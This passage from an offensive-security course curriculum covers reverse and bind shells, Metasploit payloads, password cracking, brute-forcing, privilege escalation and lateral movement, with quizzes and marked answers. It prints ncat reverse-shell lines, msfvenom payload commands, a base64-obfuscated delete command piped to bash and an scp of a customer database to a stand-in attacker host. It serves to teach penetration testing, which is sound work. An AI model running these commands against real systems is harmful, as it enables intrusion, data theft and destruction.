   > The add-to-cart request is intercepted and its price parameter is directly modified to an arbitrary lower value, since the server trusts the client-supplied price.
2. What identifies the workflow-bypass lab's vulnerable step?
   - **A multi-step process (e.g. discount/coupon flow) missing a re-validation step** ✓
   - A missing CSRF token
   - A missing TLS certificate
   - A missing rate limiter
   > The flaw is a multi-step workflow that fails to re-check a condition at a later step, allowing it to be exploited twice or out of order.
3. What is required to confirm the price-manipulation lab is solved?
   - **Completing checkout at the tampered, artificially lowered price** ✓
   - Viewing the cart page only
   - Logging in as admin
   - Submitting a CSRF PoC
   > The lab is only solved once checkout actually completes successfully at the manipulated price, proving the server didn't independently validate it.


---

## M11: Network Exploitation & Credentials

**Month 3** · Week 11 · 11 topics

Moving beyond web apps into host/network-level exploitation: shells, Metasploit, password cracking, brute-forcing, and privilege escalation on both Linux and Windows — the toolkit for turning a foothold into full compromise.

**Learning Outcomes:**

- Distinguish reverse vs bind shells and staged vs non-staged payloads
- Generate a payload with msfvenom and catch it with Metasploit's handler
- Crack password hashes with Hashcat and John the Ripper
- Identify common Linux and Windows privilege-escalation vectors
- Understand lateral movement techniques like Pass-the-Hash

**Module Resources:**

- [VulnMachines](https://vulnmachines.com) _(platform)_
- [HackTheBox Starting Point](https://www.hackthebox.com) _(platform)_
- [GTFOBins](https://gtfobins.github.io) _(link)_
- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) _(link)_

**Module Quiz (10 questions):**

1. You've just run `sessions -l` after a successful EternalBlue exploit in msfconsole and see session 1 listed. What command interacts with it?
   - **sessions -i 1** ✓
   - use sessions 1
   - exploit -i 1
   - search sessions 1
   > sessions -i <id> is the correct syntax to interact with a specific already-established session.
2. Why would an attacker choose offline hash cracking with Hashcat over online brute-forcing with Hydra against the same target account?
   - **Offline cracking works against a stolen hash with no further interaction with the live service, avoiding lockouts and detection that online brute-forcing risks** ✓
   - Hashcat is the only tool capable of cracking SSH passwords
   - Hydra cannot use wordlists, only Hashcat can
   - Offline cracking always takes longer than online brute-forcing regardless of hash type
   > Once a hash is exfiltrated, cracking it offline requires no further contact with the target, unlike online brute-forcing which generates live, detectable authentication attempts.
3. On a Linux box, `find / -perm -4000 -type f` reveals a custom SUID binary. What is the next logical step in exploiting it for privesc?
   - **Check GTFOBins for that specific binary to see if it has a known privilege-escalation technique** ✓
   - Immediately reboot the machine to apply the SUID bit
   - Run hashcat against the binary's file hash
   - Use msfvenom to generate a payload matching the binary's architecture
   > GTFOBins catalogues exactly which common Unix binaries can be abused for privesc when they carry elevated permissions like SUID.
4. A Windows service is found running as `C:\Program Files\My App\service.exe` with no quotes around the path. What is the exploitation mechanism here?
   - **Windows will try each space-delimited segment as a candidate executable path in order, so a planted binary at an earlier path (e.g. C:\Program.exe) executes instead** ✓
   - The unquoted path automatically grants SYSTEM privileges to any logged-in user
   - This only matters if AlwaysInstallElevated is also enabled
   - This vulnerability requires SeImpersonatePrivilege to exploit
   > Unquoted service paths are exploited by planting an executable at one of the earlier ambiguous path segments Windows will try before the real target.
5. Which combination correctly pairs a Windows privesc technique with its underlying mechanism?
   - **'Potato' exploits abuse token impersonation privileges like SeImpersonatePrivilege** ✓
   - AlwaysInstallElevated abuses unquoted service paths
   - Unquoted service paths abuse the sudo -l command
   - Token impersonation abuses SUID binaries
   > The Potato family specifically abuses token impersonation (e.g. SeImpersonatePrivilege), which is distinct from AlwaysInstallElevated (registry/installer policy) or unquoted paths (service configuration).
6. An attacker has a captured NTLM hash for a domain account but has not cracked it to plaintext. How can they still authenticate to another Windows host?
   - **Pass-the-Hash: authenticate directly using the hash itself, since NTLM accepts it as proof of identity** ✓
   - They cannot authenticate without the plaintext password under any circumstances
   - They must first run the hash through John the Ripper before any authentication is possible
   - They must brute-force the plaintext using Hydra before proceeding
   > Pass-the-Hash exploits the fact that NTLM authentication uses the hash itself, not the plaintext, as the credential.
7. Which two protocols would an attacker most likely use to move laterally after compromising one host in a Windows/AD network?
   - **SMB and RDP** ✓
   - FTP and Telnet
   - DNS and NTP
   - SNMP and SMTP
   > SMB (shares, Pass-the-Hash) and RDP (interactive remote sessions) are the module's named common lateral-movement protocols in Windows/AD environments.
8. Given a hash file with 32-character hex values and one with 64-character hex values, which Hashcat mode pairing is correct?
   - **-m 0 for the 32-character (MD5) file, -m 1400 for the 64-character (SHA2-256) file** ✓
   - -m 1400 for the 32-character file, -m 0 for the 64-character file
   - -a 0 for both files regardless of length
   - The hash length is irrelevant to selecting a Hashcat mode
   > MD5 hashes are 32 hex characters (mode 0) and SHA-256 hashes are 64 hex characters (mode 1400) — length is exactly how you disambiguate before cracking.
9. What is the correct methodology order for compromising a VulnMachines box end-to-end?
   - **Recon (Nmap) -> identify vulnerable service -> exploit -> privesc -> capture the flag** ✓
   - Privesc -> exploit -> recon -> flag
   - Exploit blindly -> recon -> privesc -> flag
   - Flag -> recon -> exploit -> privesc
   > The module's consistent methodology starts with recon to find attack surface before ever attempting exploitation or privilege escalation.
10. Why might a penetration tester deliberately choose a staged Meterpreter payload over a non-staged one during an engagement against a monitored network?
   - **The smaller initial stager has a lower initial detection footprint before the full payload is fetched** ✓
   - Staged payloads never require a functioning network connection
   - Staged payloads always execute faster than non-staged ones
   - Non-staged payloads cannot be caught by exploit/multi/handler
   > Staged payloads trade a follow-up network dependency for a smaller, less conspicuous initial footprint, which matters against network monitoring.

### Topics

#### 134. Reverse Shells vs Bind Shells (how they work, when to use each) `[theory]` — Week 11

Two methods of gaining remote command-line access to a compromised host after exploitation, differing in which side initiates the TCP/UDP connection. A shell is simply the command-line interface that lets an attacker execute commands and control a victim machine as if sitting in front of it; how that shell gets established (reverse vs bind) determines whether the attack traffic looks like normal outbound activity or a suspicious open listening port, which is why the choice matters for both offense (evading firewalls/NAT) and defense (knowing what to monitor for).

**Key Points:**

- Reverse shell: the target initiates the connection back to the attacker's listener - since most networks permit outbound connections, this bypasses inbound firewall/NAT rules and blends in as normal outbound traffic, giving it a lower detection risk
- Bind shell: the target opens a listening port and waits; the attacker connects in - simpler when nothing blocks inbound connections, but the open port is visible to scanning and firewalls, giving it a higher detection risk
- Reverse shell flow: attacker runs a listener -> target executes a reverse shell command connecting back -> attacker has control. Bind shell flow: target opens/listens on a port -> attacker connects to it -> attacker has control
- Both TCP and UDP variants exist for reverse shells - ncat can establish either transport
- The -n/-l/-v/-p/-e flags on a bind shell listener mean: no DNS resolution, listen mode, verbose output, specify the port, and execute a shell on connection
- Once connected (either direction), the attacker can execute commands, transfer files, manipulate processes, gather sensitive information, monitor system behavior, and pivot to other systems on the network
- This is a critical step in the hacking lifecycle immediately following successful exploitation - it converts a one-off vulnerability into ongoing interactive access

```bash
ncat 10.0.0.1 4242 -e /bin/bash
ncat --udp 10.0.0.1 4242 -e /bin/bash
ncat -nlvp 51337 -e /bin/bash
```

**Resources:**

- [ired.team Red Team Notes](https://www.ired.team/) _(link)_
- [HackTricks](https://book.hacktricks.wiki/) _(link)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(tool)_

**Quick Quiz:**

1. What is the defining difference between a reverse shell and a bind shell?
   - **A reverse shell has the target initiate the connection back to the attacker, while a bind shell has the target listen and the attacker connect in** ✓
   - A reverse shell always uses encryption while a bind shell never does
   - A bind shell requires Metasploit while a reverse shell does not
   - A reverse shell only works over UDP while a bind shell only works over TCP
   > The key distinction is which side initiates the connection: reverse shells call back to the attacker, bind shells wait for the attacker to connect in.
2. Why is a reverse shell often preferred when the target sits behind a NAT/firewall with strict inbound rules?
   - **Because the outbound connection it creates looks like normal traffic and isn't blocked by inbound filtering** ✓
   - Because it doesn't require a listener on the attacker's machine
   - Because it encrypts traffic automatically, unlike a bind shell
   - Because it can only be caught with Metasploit, which bypasses firewalls
   > Outbound connections are typically far less restricted than inbound ones, so a reverse shell slips past firewall/NAT rules that would block an attacker connecting in to a bind shell.
3. Which statement correctly describes a bind shell's main practical weakness?
   - **It requires the attacker to connect inbound to a port opened on the target, which is commonly blocked by the target's own firewall** ✓
   - It cannot execute commands once connected
   - It only functions over ICMP, which is rarely permitted
   - It requires physical access to the target machine
   > A bind shell opens a listening port on the target that the attacker must reach inbound, and inbound connections are exactly what firewalls are designed to block.

#### 135. Payload Types: Staged vs Non-Staged (Meterpreter, shell) `[theory]` — Week 11

A payload is the piece of an attack that actually runs after successful exploitation - it's what gives the attacker control, data, or persistence on the compromised system, delivered either as a small stager that fetches the rest over the network (staged) or as one complete file/command executed in a single shot (non-staged). Understanding the trade-off matters operationally: staged payloads are stealthier and more flexible but depend on a live follow-up connection, while non-staged payloads are faster and self-contained but expose the full malicious code to detection immediately.

**Key Points:**

- Staged: a tiny stager makes the first connection back, then the larger main payload is downloaded and executed over that same link - smaller initial footprint means lower AV/detection risk and lets the attacker decide the final payload later, at the cost of needing an active network connection for stage 2
- Non-staged: the complete payload is delivered and executed in one file/command with no follow-up communication required - faster and simpler, good for offline systems or quick one-time attacks, but the full payload is visible to detection from the moment of delivery
- msfvenom generates both from the same handler workflow: staged uses windows/meterpreter/reverse_tcp, non-staged uses windows/meterpreter_reverse_tcp (slash vs underscore) - exploit/multi/handler in msfconsole catches either once payload/LHOST/LPORT are set to match
- Payload execution happens through several mechanisms: embedding malicious code in files, over network connections, or by injecting code into running processes
- Broader execution techniques: Remote Code Execution (running code on a remote target), Local Code Execution (once access is already gained), Process Injection (into a legitimate process), Fileless payloads (run directly in memory, no disk artifact), and Command Injection (through poorly secured inputs)
- Common payload types beyond shells: keyloggers (record keystrokes), downloaders (fetch and install more malware), ransomware payloads (encrypt files and demand payment), and information stealers (collect credentials, files, or screenshots)
- Trade-off summary: staged payloads are small, network-dependent, slower, lower detection risk, and flexible; non-staged payloads are large, self-contained, faster, higher initial detection risk, and fixed once delivered

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe
msfvenom -p windows/meterpreter_reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
sessions -l
```

**Resources:**

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) _(link)_
- [Metasploit Documentation](https://docs.metasploit.com/) _(link)_
- [HackTricks](https://book.hacktricks.wiki/) _(link)_

**Quick Quiz:**

1. What is the core trade-off between a staged and a non-staged payload?
   - **Staged payloads send a small stager first and fetch the rest over a follow-up connection, lowering the initial footprint; non-staged payloads deliver everything in one shot** ✓
   - Staged payloads never require a listener; non-staged payloads always do
   - Non-staged payloads are smaller in every case than staged payloads
   - Staged payloads only work on Linux; non-staged only work on Windows
   > Staged payloads split delivery into a small stager plus a follow-up download, while non-staged payloads are fully self-contained and delivered at once.
2. In `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe -o payload.exe`, what do LHOST and LPORT configure?
   - **The attacker's listening IP and port that the payload will connect back to** ✓
   - The target's IP and the port to scan
   - The output file's encryption key and format
   - The Metasploit module's CVE identifier and version
   > For a reverse payload, LHOST/LPORT tell the payload where the attacker's handler is listening so it knows where to call back.
3. After generating a reverse Meterpreter payload with msfvenom, what is `exploit/multi/handler` used for?
   - **It's the Metasploit module that sets up a listener to catch the incoming connection from the payload once it's executed on the target** ✓
   - It's the module that generates the payload file itself
   - It's used only for brute-forcing SSH credentials
   - It automatically finds and patches the vulnerability that was exploited
   > msfvenom only generates the payload; a separate handler (exploit/multi/handler) must be running in msfconsole to catch the callback.

#### 136. Metasploit Framework Basics (msfconsole, search, use, set, exploit, sessions) `[theory]` — Week 11

Metasploit bundles exploit modules, payloads, and post-exploitation tools behind a single console interface, msfconsole, and is one of several standard tools security testers reach for during the "Gaining Access" phase of an engagement alongside Hydra (automated brute force), John the Ripper/Hashcat (password cracking), and Gophish (simulated phishing) - each covering a different technique in the same phase of the attack lifecycle.

**Key Points:**

- search finds a module by CVE, name, or platform; use selects it
- set configures module options (RHOSTS, LHOST, payload); exploit (or run) launches the attack
- sessions -l lists active sessions from successful exploitation; sessions -i <id> interacts with one, letting an operator continue with privilege escalation or lateral movement from inside the resulting shell
- Real attack-chain example from the source material: an attacker scans a web application, finds it running an outdated version of software vulnerable to Remote Code Execution, uses Metasploit to deliver a payload that provides shell access to the server, and now has basic user-level access - the same search -> use -> set -> exploit workflow drives every module regardless of the underlying vulnerability
- Metasploit's role in the broader toolset: it exploits known vulnerabilities, while Hydra automates brute-force login attempts, John/Hashcat crack recovered password hashes, and Gophish simulates phishing campaigns - together covering exploitation, credential attacks, and social engineering

```bash
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
exploit
sessions -l
sessions -i 1
```

**Resources:**

- [Metasploit Unleashed](https://www.offsec.com/metasploit-unleashed/) _(link)_
- [Metasploit Documentation](https://docs.metasploit.com/) _(link)_
- [IppSec (HTB walkthroughs)](https://www.youtube.com/@ippsec) _(video)_

**Quick Quiz:**

1. In msfconsole, what is the correct order of commands to find, select, configure, and launch an exploit module?
   - **search -> use -> set -> exploit** ✓
   - use -> search -> exploit -> set
   - exploit -> set -> use -> search
   - set -> search -> use -> exploit
   > You search to locate the right module, use to select it, set to configure its options, then exploit/run to launch it.
2. What does `sessions -i <id>` do after a successful exploitation?
   - **Interacts with the specified active session, dropping you into that shell/Meterpreter session** ✓
   - Lists all currently active sessions
   - Kills the specified session immediately
   - Searches for new exploit modules matching the session's OS
   > sessions -l lists sessions, while sessions -i <id> interacts with one specific session by its ID.
3. What does the `set RHOSTS 10.10.10.5` command configure before running an exploit module?
   - **The target host(s) the exploit module will attack** ✓
   - The attacker's own listening IP address
   - The payload's output filename
   - The wordlist used for password guessing
   > RHOSTS specifies the remote host(s) to target, as distinct from LHOST which is the attacker's own listening address.

#### 137. Password Hash Cracking with Hashcat (modes, rules, wordlists) `[theory]` — Week 11

Hashcat is a GPU-accelerated password cracker, dramatically faster than CPU-based cracking because of the parallel nature of GPUs - password cracking is significantly faster on a GPU, and running it inside a Virtual Machine (which typically can't access the GPU directly) is noticeably slower. Choosing the right mode (-m) and attack type (-a) turns a raw hash dump into recovered plaintext passwords, which is exactly the kind of post-exploitation credential work a pentester or CTF player does after breaching a database or credential store.

**Key Points:**

- -m selects the hash-type mode (e.g. 0 = MD5, 1400 = SHA2-256) - check hashcat's example_hashes wiki page to match a hash's format/length to the correct mode rather than guessing
- -a selects the attack mode (0 = straight wordlist attack, no additional brute-force character generation combined in, which keeps a run fast and predictable for pure dictionary cracking)
- --username tells hashcat the hash file also contains usernames alongside each hash, so it parses and skips that column correctly instead of treating it as part of the hash
- rockyou.txt is the standard go-to wordlist for cracking labs
- A successful crack prints hash:plaintext on its own line (e.g. ef92b778bafe771e89245b89ecbc08a44a4e166c06659911881f383d4473e94f:password123) followed by a full status block showing Recovered count, Progress, Speed in kH/s, and Time.Started/Estimated - useful for judging throughput and how close a run is to finishing
- A single unsalted hash can crack almost instantly against rockyou.txt on a decent GPU - the reference run recovered a password in well under a second at ~72,253 kH/s

```bash
hashcat -a 0 -m 0 hash.txt rockyou.txt
hashcat -m 1400 hash.txt ~/Downloads/rockyou.txt --username
hashcat -a 0 -m 0 <hash_file> <path_to_wordlist> --username
```

**Resources:**

- [Hashcat](https://hashcat.net/hashcat/) _(tool)_
- [Hashcat example hashes wiki](https://hashcat.net/wiki/doku.php?id=example_hashes) _(link)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_

**Quick Quiz:**

1. What does Hashcat's `-m` flag select?
   - **The hash-type mode, e.g. 0 for MD5 or 1400 for SHA2-256** ✓
   - The number of GPU threads to use
   - The attack mode, such as a straight wordlist attack
   - The output file where cracked passwords are saved
   > -m selects the hash-type mode; picking the wrong mode for a given hash format will cause cracking to fail or produce no matches.
2. What does `-a 0` specify in a Hashcat command like `hashcat -a 0 -m 0 hash.txt rockyou.txt`?
   - **A straight wordlist attack mode, trying each word in the wordlist directly against the hashes** ✓
   - The hash-type mode (MD5)
   - A brute-force mask attack trying all character combinations
   - The number of parallel hash files to process
   > -a controls the attack mode, and 0 is the straight/dictionary attack mode, distinct from -m which selects the hash algorithm.
3. Why is rockyou.txt the standard go-to wordlist for cracking labs?
   - **It's a large, widely available list of real breached passwords, giving a strong hit rate against realistic weak passwords** ✓
   - It's the only wordlist Hashcat is able to load
   - It contains only numeric PINs
   - It's generated freshly by Hashcat for every session
   > rockyou.txt is a well-known leaked password list used ubiquitously in cracking labs precisely because it reflects real-world weak password choices.

#### 138. Password Hash Cracking with John the Ripper `[theory]` — Week 11

John the Ripper is the classic CPU-based password cracker - simpler to invoke than Hashcat for quick jobs thanks to automatic hash-format detection, and a common cross-check tool alongside Hashcat when working through a batch of recovered hashes.

**Key Points:**

- john with no options auto-detects the hash format and uses its own default wordlist if none is specified
- --wordlist explicitly points john at a wordlist like rockyou.txt instead of its built-in one
- --format explicitly specifies the hash algorithm when auto-detection is ambiguous, e.g. --format=raw-SHA256 for a raw SHA-256 hash
- john --show (or --show --format=Raw-SHA256 for non-default formats) reveals already-cracked passwords from a previous session without re-cracking
- Real transcript from a cracked SHA-256 hash shows the output format to expect: the plaintext printed next to a '(?)' marker (e.g. password123 (?)), followed by a summary line like '1g 0:00:00:00 DONE ... 25.00g/s 6553Kp/s'
- John may warn about poor OpenMP scalability for certain hash types and suggest --fork=16 to parallelize across CPU cores instead
- John rejects passwords longer than roughly 18 characters (worst-case UTF-8) to 55 characters (ASCII) by default

```bash
john hash.txt --wordlist=rockyou.txt
john --format=raw-SHA256 hash.txt --wordlist=/home/user/Downloads/rockyou.txt
john --show hash.txt
```

**Resources:**

- [John the Ripper](https://www.openwall.com/john/) _(tool)_
- [Hashcat](https://hashcat.net/hashcat/) _(tool)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_

**Quick Quiz:**

1. What happens when you run `john hash.txt` with no additional options?
   - **John auto-detects the hash format and cracks using its default wordlist/rules** ✓
   - John refuses to run without an explicit --format flag
   - John only lists the hash types present without attempting to crack them
   - John requires GPU acceleration to start
   > John the Ripper is designed to auto-detect the hash format and immediately attempt cracking with its built-in defaults when no options are given.
2. When would you need the `--format` flag with John the Ripper?
   - **When automatic hash-format detection is ambiguous and you need to specify the algorithm explicitly, e.g. --format=raw-SHA256** ✓
   - Only when cracking Wi-Fi handshakes
   - It is required on every single invocation of John
   - It specifies which GPU to use for cracking
   > --format overrides auto-detection for cases where the hash format is unclear or multiple formats could match.
3. What does `john --show hash.txt` do?
   - **Displays already-cracked passwords from a previous run without re-running the cracking process** ✓
   - Starts a brand-new cracking session against hash.txt
   - Shows the raw hex bytes of the hash file
   - Benchmarks John's cracking speed on the current hardware
   > --show reads John's stored cracked-password state (the .pot file) and prints results already recovered, rather than cracking again.

#### 139. Brute-Force Techniques (Hydra, Medusa - HTTP, SSH, FTP targets) `[theory]` — Week 11

Online brute-forcing tests credentials directly against a live service - much noisier and slower than offline hash cracking, and a prime detection/lockout risk. Real-world brute-force attacks come in several distinct flavors, from naive character-by-character guessing to targeted credential replay, and picking the right one (and defending against it) requires understanding what each actually does.

**Key Points:**

- Simple brute force systematically tries every character combination (e.g. 'a', then 'aa', then 'ab'...) until it finds the password - only practical against short, simple passwords like 'password123' or 'admin1234'
- Dictionary attacks use a list of real words, common phrases, and previously leaked passwords (commonly rockyou.txt) instead of raw combinations - much faster since it skips implausible strings
- Hybrid attacks combine both: start from a dictionary word (e.g. 'sunshine') and append random characters, numbers, or symbols (e.g. 'sunshine2023!')
- Reverse brute force flips the usual direction: start from a known/leaked password (e.g. 'Password123!') and try it against thousands of usernames or email addresses to find which accounts it unlocks
- Credential stuffing replays exact username:password pairs leaked in one breach against unrelated sites, exploiting password reuse (e.g. credentials leaked from Netflix tried against a banking site)
- Rainbow table attacks use precomputed tables of password hashes instead of hashing candidates on the fly, trading storage for speed once a hashed password database is breached
- Password spraying (MITRE ATT&CK T1110.003) tries one or a small list of common passwords across many different accounts instead of many passwords against one account - this avoids the account lockouts that a single-account brute force would trigger; crackmapexec smb 10.10.1.0/24 -u users.txt -p Welcome@123 is a concrete example, and defenses include enforcing strong password policies, detecting many-account login attempts from a single host in a short window, and setting an appropriate lockout threshold at the domain level
- Common targets/tools: web logins (HTTP/S), SSH/FTP/SMB/RDP, and REST/GraphQL APIs, driven by Hydra, Medusa, Ncrack, or Burp Suite Intruder for web login forms

```bash
hydra -l admin -P rockyou.txt ssh://10.10.10.5
crackmapexec smb 10.10.1.0/24 -u users.txt -p Welcome@123
```

**Resources:**

- [THC-Hydra](https://github.com/vanhauser-thc/thc-hydra) _(tool)_
- [Medusa](https://github.com/jmk-foofus/medusa) _(tool)_
- [SecLists](https://github.com/danielmiessler/SecLists) _(tool)_

**Quick Quiz:**

1. What distinguishes password spraying from a standard dictionary brute-force attack?
   - **Password spraying tries one common password across many usernames to avoid account lockouts, rather than many passwords against one username** ✓
   - Password spraying only works against FTP servers
   - Password spraying requires no wordlist at all
   - Password spraying is always faster than dictionary attacks because it uses GPUs
   > Spraying flips the usual approach: it spreads a small number of guesses across many accounts, precisely to stay under per-account lockout thresholds.
2. Why is online brute-forcing (Hydra/Medusa) considered noisier and riskier than offline hash cracking?
   - **Every guess is a live authentication attempt against the target service, generating logs/alerts and risking account lockout** ✓
   - Online tools cannot use wordlists at all
   - Offline cracking always requires more attempts than online brute-forcing
   - Online brute-forcing never works against modern authentication systems
   > Offline cracking works against a stolen hash with no interaction with the live system, while online brute-forcing must hit the real service repeatedly, which is detectable and can trigger lockouts.
3. In `hydra -l admin -P rockyou.txt ssh://10.10.10.5`, what does `-l admin` specify?
   - **A single, fixed username (admin) to try against every password in the wordlist** ✓
   - A list of usernames to load from a file named admin
   - The target IP address
   - The protocol/service to attack
   > Lowercase -l takes one specific username, while uppercase -L would load a file of multiple usernames; -P loads the password wordlist.

#### 140. Privilege Escalation - Linux (SUID, sudo -l, cron jobs, writable paths, GTFOBins) `[theory]` — Week 11

Turning a low-privilege foothold into root - Linux privesc is largely about finding misconfigurations that let you run something as a higher-privileged user, whether through a permissive sudo rule, a SUID binary, a writable cron job, or a kernel-level exploit.

**Key Points:**

- sudo -l shows what the current user can run as root without a password
- SUID binaries owned by root run with root privileges regardless of who executes them - find with find / -perm -4000
- GTFOBins catalogues how common Unix binaries (find, vim, less) can be abused for privesc if run with elevated rights
- Writable cron scripts run by root let you inject your own commands into the next scheduled run
- Real misconfiguration example: a server has a sudo rule allowing a low-privileged user to run nano as root - because nano can spawn a shell, that single misconfigured rule is enough to execute commands as root and gain full control of the system
- Dirty COW is a named Linux kernel privilege-escalation exploit (a race condition in the kernel's copy-on-write handling), an example of exploiting a vulnerable kernel directly to gain root
- Vertical privilege escalation moves from a low-privilege account to a higher one (e.g. regular user to root); horizontal privilege escalation stays at the same privilege level but reaches another user's account or data instead - e.g. finding a session ID in logs and using it to hijack another user's session without needing their credentials

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v /proc
```

**Resources:**

- [GTFOBins](https://gtfobins.github.io) _(link)_
- [HackTricks](https://book.hacktricks.wiki/) _(link)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(tool)_
- [ired.team Red Team Notes](https://www.ired.team/) _(link)_

**Quick Quiz:**

1. What does `sudo -l` reveal during Linux privilege escalation enumeration?
   - **What commands the current user is permitted to run as root, and whether a password is required** ✓
   - The full list of SUID binaries on the system
   - All writable cron jobs owned by root
   - The system's currently installed kernel version
   > sudo -l lists the current user's sudo permissions, which frequently reveals a command that can be abused to gain root.
2. Why are SUID binaries a common privilege escalation vector on Linux?
   - **A SUID binary owned by root executes with root privileges regardless of which user runs it, so an abusable one grants root access** ✓
   - SUID binaries can only be executed by root, making them irrelevant to privesc
   - SUID marks a file as read-only for all users
   - SUID binaries are automatically added to cron by the OS
   > The SUID bit makes a binary run with its owner's privileges (root, if root-owned) no matter who executes it, which GTFOBins catalogues abuse cases for.
3. What makes a writable cron script owned/run by root a privilege escalation risk?
   - **An attacker can inject arbitrary commands into the script, which will then execute with root's privileges on the next scheduled run** ✓
   - Cron scripts cannot be modified once created, so this is not actually a risk
   - It only affects the interactive login shell, not scheduled tasks
   - It requires the attacker to already have root access to exploit
   > If a low-privileged user can write to a script that root's cron job executes, their injected commands run with root's privileges at the next scheduled interval.

#### 141. Privilege Escalation - Windows (AlwaysInstallElevated, unquoted paths, token impersonation) `[theory]` — Week 11

Windows privesc typically abuses misconfigured services, installer policies, or token handling to jump from a standard user to SYSTEM/admin - and where credential material is involved, dedicated extraction tools do the heavy lifting.

**Key Points:**

- AlwaysInstallElevated: a registry misconfiguration that lets any user install an MSI package with SYSTEM privileges
- Unquoted service paths: a service path with spaces and no quotes lets an attacker plant an executable earlier in the path that gets run instead
- Token impersonation (e.g. via a service account with SeImpersonatePrivilege) can be abused to escalate to SYSTEM (the 'Potato' family of exploits)
- Mimikatz is the named Windows credential-theft tool used to extract and abuse cached credentials, hashes, and tokens as part of vertical privilege escalation
- Same vertical vs horizontal framing as Linux applies on Windows: vertical means climbing from a regular user to admin/root-equivalent control; horizontal means staying at the same privilege level but accessing a different user's resources

```bash
wmic service get name,pathname,startmode
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

**Resources:**

- [LOLBAS Project](https://lolbas-project.github.io/) _(link)_
- [HackTricks](https://book.hacktricks.wiki/) _(link)_
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) _(tool)_
- [ired.team Red Team Notes](https://www.ired.team/) _(link)_

**Quick Quiz:**

1. What does the AlwaysInstallElevated misconfiguration allow on Windows?
   - **Any user to install an MSI package with SYSTEM privileges, due to a registry policy setting** ✓
   - Any user to read any file on disk regardless of permissions
   - Remote attackers to authenticate without credentials
   - Services to automatically restart as a low-privileged user
   > When the AlwaysInstallElevated registry keys are set for both HKLM and HKCU, Windows Installer runs all MSI installs with SYSTEM rights, letting any user install a malicious MSI as SYSTEM.
2. Why is an unquoted service path with spaces a privilege escalation risk?
   - **Windows tries each space-delimited segment as a possible executable path in order, so a planted executable earlier in the path can run instead of the intended one** ✓
   - It causes the service to crash and reveal a memory dump with credentials
   - It disables the Windows Firewall for that service
   - It only affects services running as SYSTEM already, so it has no privesc value
   > Without quotes, C:\Program Files\My Service\svc.exe can be interpreted as C:\Program.exe first, so an attacker who can write there plants a malicious binary that runs with the service's privileges.
3. What is the underlying abuse behind the 'Potato' family of Windows privesc exploits?
   - **Token impersonation via a privilege like SeImpersonatePrivilege, used to escalate a service account to SYSTEM** ✓
   - Brute-forcing the local administrator password
   - Exploiting a buffer overflow in the Windows kernel
   - Modifying DNS records to redirect authentication traffic
   > The Potato exploits abuse token impersonation privileges (e.g. SeImpersonatePrivilege) held by service accounts to trick a SYSTEM process into authenticating, yielding a SYSTEM token.

#### 142. Lateral Movement & Pivoting Basics (Pass-the-Hash, SMB, RDP) `[theory]` — Week 11

Once one host is compromised, lateral movement is how an attacker reaches other hosts in the same network without needing to crack any more passwords, while techniques like ARP spoofing let them intercept traffic on the local segment outright. This is also where the later stages of a compromise play out: maintaining a foothold across reboots and cleanup attempts, and finally covering tracks so the activity goes unnoticed - the full arc from initial pivot to a clean exit.

**Key Points:**

- Pass-the-Hash: authenticate to another Windows host using a stolen NTLM hash directly, without ever cracking it to plaintext
- SMB and RDP are the two most common lateral-movement protocols in Windows/AD environments
- Pivoting: routing traffic through a compromised host to reach network segments not directly reachable from the attacker's machine
- ARP spoofing (ARP poisoning) is a LAN-level interception technique: the attacker sends forged ARP replies mapping their own MAC address to a legitimate IP (often the gateway), so victim devices update their ARP cache with the wrong mapping and their traffic routes through the attacker - a classic Man-in-the-Middle technique useful for intercepting lateral traffic. Detect it with Wireshark or arp-scan (watching for suspicious/inconsistent ARP cache entries); mitigate with static ARP entries, packet filtering via firewalls/IDS, and encrypting traffic (HTTPS) so intercepted data stays unreadable
- ARP spoofing enables three outcomes: interception (capturing passwords or unencrypted data), session hijacking (injecting into or taking over an ongoing session), and denial of service (disrupting communication via malicious ARP replies)
- Maintaining access across a network relies on persistence: scheduled tasks (Windows) / cron jobs (Linux) that re-run malicious code on a schedule or at startup, registry modifications that launch a backdoor automatically, web shells uploaded to a compromised web server, hidden backdoors that bypass normal authentication, new unauthorized user accounts, and rootkits for advanced attackers who need to stay hidden even after cleanup efforts
- Once access and persistence are established, data exfiltration commonly follows: manual methods (scp/ftp to an external server), automated tooling (e.g. Cobalt Strike or custom scripts for bulk extraction), steganography (hiding stolen data inside images or other innocuous files), and network misuse like DNS tunneling to move data out through a protocol that looks legitimate
- Clearing tracks closes out the chain: log cleansing (editing or replacing log entries that recorded the attacker's activity), command obfuscation (e.g. base64-encoding a destructive command before piping it to bash so it isn't visible in shell history in plaintext), secure deletion with shred -u or srm so overwritten files can't be recovered, and routing C2 traffic through Tor or a proxy chain to hide the attacker's real IP

```bash
arp-scan --localnet
echo cm0gLXJmIC9zZW5zaXRpdmVfZGF0YQ== | base64 -d | bash
shred -u exfil_script.sh
scp customer_data.db attacker@malicious-server.com:/loot/
```

**Resources:**

- [ired.team Red Team Notes](https://www.ired.team/) _(link)_
- [HackTricks](https://book.hacktricks.wiki/) _(link)_
- [MITRE ATT&CK](https://attack.mitre.org) _(link)_

**Quick Quiz:**

1. What is Pass-the-Hash, and why is it powerful for lateral movement?
   - **It authenticates to another Windows host using a stolen NTLM hash directly, without ever needing to crack it to plaintext** ✓
   - It is a technique for cracking password hashes faster using GPU clusters
   - It requires physical access to the target's hard drive
   - It only works against Linux SSH servers
